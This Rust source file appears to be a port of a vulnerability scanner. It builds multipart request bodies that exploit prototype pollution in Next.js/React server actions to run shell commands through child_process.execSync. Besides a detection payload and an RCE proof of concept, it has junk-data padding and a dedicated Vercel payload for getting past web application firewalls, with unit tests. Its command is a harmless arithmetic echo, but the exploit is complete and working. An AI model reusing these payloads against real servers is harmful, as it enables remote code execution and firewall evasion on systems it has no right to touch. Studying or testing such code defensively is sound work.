use rand::Rng;

/// Hardcoded content-type matching the Python implementation exactly
const CONTENT_TYPE: &str = "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad";

/// Generate random junk data for WAF bypass
fn generate_junk_data(size_bytes: usize) -> (String, String) {
    let mut rng = rand::thread_rng();

    // Generate 12 lowercase letters for param name
    let param_name: String = (0..12)
        .map(|_| rng.gen_range(b'a'..=b'z') as char)
        .collect();

    // Generate alphanumeric junk data
    let junk: String = (0..size_bytes)
        .map(|_| {
            let idx = rng.gen_range(0..62);
            match idx {
                0..=9 => (b'0' + idx) as char,
                10..=35 => (b'a' + idx - 10) as char,
                _ => (b'A' + idx - 36) as char,
            }
        })
        .collect();

    (param_name, junk)
}

/// Build the safe multipart form data payload for side-channel detection
pub fn build_safe_payload() -> (String, &'static str) {
    let body = "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"1\"\r\n\r\n\
{}\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"0\"\r\n\r\n\
[\"$1:aa:aa\"]\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
        .to_string();

    (body, CONTENT_TYPE)
}

/// Build the RCE PoC multipart form data payload
pub fn build_rce_payload(windows: bool, waf_bypass: bool, waf_bypass_size_kb: u32) -> (String, &'static str) {
    let cmd = if windows {
        r#"powershell -c \"41*271\""#
    } else {
        "echo $((41*271))"
    };

    let prefix_payload = format!(
        "var res=process.mainModule.require('child_process').execSync('{}')\
.toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),\
{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});",
        cmd
    );

    let part0 = format!(
        r#"{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{{\"then\":\"$B1337\"}}","_response":{{"_prefix":"{}","_chunks":"$Q2","_formData":{{"get":"$1:constructor:constructor"}}}}}}"#,
        prefix_payload
    );

    let mut parts = Vec::new();

    // Add junk data at the start if WAF bypass is enabled
    if waf_bypass {
        let (param_name, junk) = generate_junk_data((waf_bypass_size_kb * 1024) as usize);
        parts.push(format!(
            "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"{}\"\r\n\r\n\
{}\r\n",
            param_name, junk
        ));
    }

    parts.push(format!(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"0\"\r\n\r\n\
{}\r\n",
        part0
    ));

    parts.push(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"1\"\r\n\r\n\
\"$@0\"\r\n"
            .to_string(),
    );

    parts.push(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"2\"\r\n\r\n\
[]\r\n"
            .to_string(),
    );

    parts.push("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--".to_string());

    (parts.join(""), CONTENT_TYPE)
}

/// Build the Vercel WAF bypass multipart form data payload
pub fn build_vercel_waf_bypass_payload() -> (String, &'static str) {
    // Part 0 with the RCE payload - must match Python exactly
    let part0 = r#"{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}"#;

    // Part 3 contains Unicode escapes from Python: {"\"$\u0024":{}}
    // \u0024 is the dollar sign $, so it becomes {"\"$$":{}}
    let part3 = r#"{"\"$$":{}}"#;

    let body = format!(
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"0\"\r\n\r\n\
{}\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"1\"\r\n\r\n\
\"$@0\"\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"2\"\r\n\r\n\
[]\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n\
Content-Disposition: form-data; name=\"3\"\r\n\r\n\
{}\r\n\
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
        part0, part3
    );

    (body, CONTENT_TYPE)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_payload_has_correct_boundary() {
        let (body, content_type) = build_safe_payload();
        assert!(body.contains("------WebKitFormBoundaryx8jO2oVc6SWP3Sad"));
        assert!(content_type.contains("----WebKitFormBoundaryx8jO2oVc6SWP3Sad"));
    }

    #[test]
    fn test_rce_payload_unix() {
        let (body, _) = build_rce_payload(false, false, 128);
        assert!(body.contains("echo $((41*271))"));
        assert!(!body.contains("powershell"));
    }

    #[test]
    fn test_rce_payload_windows() {
        let (body, _) = build_rce_payload(true, false, 128);
        assert!(body.contains("powershell"));
    }

    #[test]
    fn test_waf_bypass_adds_junk() {
        let (body_without, _) = build_rce_payload(false, false, 128);
        let (body_with, _) = build_rce_payload(false, true, 128);
        assert!(body_with.len() > body_without.len() + 128 * 1024);
    }

    #[test]
    fn test_vercel_bypass_payload() {
        let (body, _) = build_vercel_waf_bypass_payload();
        assert!(body.contains("name=\"3\""));
        assert!(body.contains("echo $((41*271))"));
    }
}
